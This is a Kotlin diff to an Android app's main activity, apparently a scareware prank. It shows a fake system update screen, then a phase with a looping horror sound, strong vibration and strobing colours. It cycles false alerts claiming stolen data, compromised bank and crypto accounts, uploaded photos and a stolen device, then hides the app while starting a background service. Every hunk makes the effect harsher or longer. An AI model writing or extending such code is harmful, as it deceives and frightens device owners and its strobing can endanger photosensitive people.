@@ -38,7 +38,8 @@ class MainActivity : AppCompatActivity() {
             WindowManager.LayoutParams.FLAG_FULLSCREEN or
                     WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                     WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
-                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
+                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD or
+                    WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON
         )
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
             window.attributes.layoutInDisplayCutoutMode =
@@ -48,6 +49,7 @@ class MainActivity : AppCompatActivity() {
                 View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                         or View.SYSTEM_UI_FLAG_FULLSCREEN
                         or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
+                        or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                 )
 
         setContentView(R.layout.activity_main)
@@ -60,10 +62,8 @@ class MainActivity : AppCompatActivity() {
             }
         } catch (_: Exception) {}
 
-        // System Update screen stays ~7 seconds
-        handler.postDelayed({
-            showScarePhase()
-        }, 7000)
+        // System Update hiện 5 giây rồi vào màn dọa đầy đủ
+        handler.postDelayed({ showScarePhase() }, 5000)
     }
 
     private fun showScarePhase() {
@@ -73,6 +73,7 @@ class MainActivity : AppCompatActivity() {
         findViewById<LinearLayout>(R.id.updateScreen).visibility = View.GONE
         findViewById<View>(R.id.scareScreen).visibility = View.VISIBLE
 
+        // Âm thanh kinh dị loop
         try {
             mediaPlayer = MediaPlayer.create(this, R.raw.scare_sound)
             mediaPlayer?.isLooping = true
@@ -96,13 +97,14 @@ class MainActivity : AppCompatActivity() {
             } catch (_: Exception) {}
         }
 
+        // Rung mạnh
         try {
             val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                v.vibrate(VibrationEffect.createWaveform(longArrayOf(0, 500, 200, 500, 200, 900), 0))
+                v.vibrate(VibrationEffect.createWaveform(longArrayOf(0, 600, 150, 600, 150, 1000), 0))
             } else {
                 @Suppress("DEPRECATION")
-                v.vibrate(longArrayOf(0, 500, 200, 500, 200, 900), 0)
+                v.vibrate(longArrayOf(0, 600, 150, 600, 150, 1000), 0)
             }
         } catch (_: Exception) {}
 
@@ -116,16 +118,14 @@ class MainActivity : AppCompatActivity() {
             cure.text = """
                 【解除病毒 / إزالة الفيروس】
                 جارٍ التنظيف... 正在清理...
-                (لن يتوقف إلا بعد إلغاء تثبيت التطبيق)
+                لن يتوقف إلا بعد إلغاء تثبيت التطبيق
             """.trimIndent()
-            handler.postDelayed({
-                startLagAndHide()
-            }, 2500)
+            // Vẫn giữ màn dọa thêm vài giây rồi mới ẩn
+            handler.postDelayed({ startLagAndHide() }, 4000)
         }
 
-        handler.postDelayed({
-            startLagAndHide()
-        }, 25000)
+        // Màn dọa ở lại ít nhất ~35 giây trước khi tự ẩn + lag
+        handler.postDelayed({ startLagAndHide() }, 35000)
     }
 
     private fun startGlitch() {
@@ -135,15 +135,22 @@ class MainActivity : AppCompatActivity() {
             override fun run() {
                 val colors = intArrayOf(
                     Color.BLACK, Color.RED, Color.WHITE,
-                    Color.YELLOW, Color.rgb(180, 0, 0)
+                    Color.YELLOW, Color.rgb(200, 0, 0), Color.rgb(40, 0, 0)
                 )
                 root.setBackgroundColor(colors[Random.nextInt(colors.size)])
-                val anim = AlphaAnimation(0.2f, 1f)
-                anim.duration = 55
+
+                // Nhấp nháy ảnh mạnh
+                val anim = AlphaAnimation(0.15f, 1f)
+                anim.duration = 50
                 anim.repeatMode = Animation.REVERSE
-                anim.repeatCount = 2
+                anim.repeatCount = 4
                 img.startAnimation(anim)
-                handler.postDelayed(this, Random.nextLong(70, 300))
+
+                // Đôi khi scale ảnh cho cảm giác nhiễu
+                img.scaleX = if (Random.nextBoolean()) 1.05f else 0.97f
+                img.scaleY = if (Random.nextBoolean()) 1.05f else 0.97f
+
+                handler.postDelayed(this, Random.nextLong(60, 220))
             }
         }
         handler.post(glitchRunnable!!)
@@ -157,7 +164,8 @@ class MainActivity : AppCompatActivity() {
             "⚠ تم سرقة بياناتك ⚠",
             "BANK / CRYPTO COMPROMISED",
             "PHOTOS & MESSAGES UPLOADED",
-            "⚠ SYSTEM DESTROYED ⚠"
+            "⚠ SYSTEM DESTROYED ⚠",
+            "⚠ الجهاز مسروق ⚠"
         )
         val tv = findViewById<TextView>(R.id.scareText)
         var i = 0
@@ -165,7 +173,7 @@ class MainActivity : AppCompatActivity() {
             override fun run() {
                 tv.text = messages[i % messages.size]
                 i++
-                handler.postDelayed(this, 1300)
+                handler.postDelayed(this, 1200)
             }
         })
     }
@@ -189,18 +197,23 @@ class MainActivity : AppCompatActivity() {
         } else {
             startService(svc)
         }
-        try { mediaPlayer?.stop(); mediaPlayer?.release() } catch (_: Exception) {}
+        try {
+            mediaPlayer?.stop()
+            mediaPlayer?.release()
+        } catch (_: Exception) {}
         mediaPlayer = null
         glitchRunnable?.let { handler.removeCallbacks(it) }
         finishAndRemoveTask()
     }
 
     override fun onUserLeaveHint() {
-        startLagAndHide()
+        // Chỉ ẩn khi đã vào màn dọa
+        if (scareStarted) startLagAndHide()
     }
 
     override fun onBackPressed() {
-        startLagAndHide()
+        if (scareStarted) startLagAndHide()
+        else super.onBackPressed()
     }
 
     override fun onDestroy() {
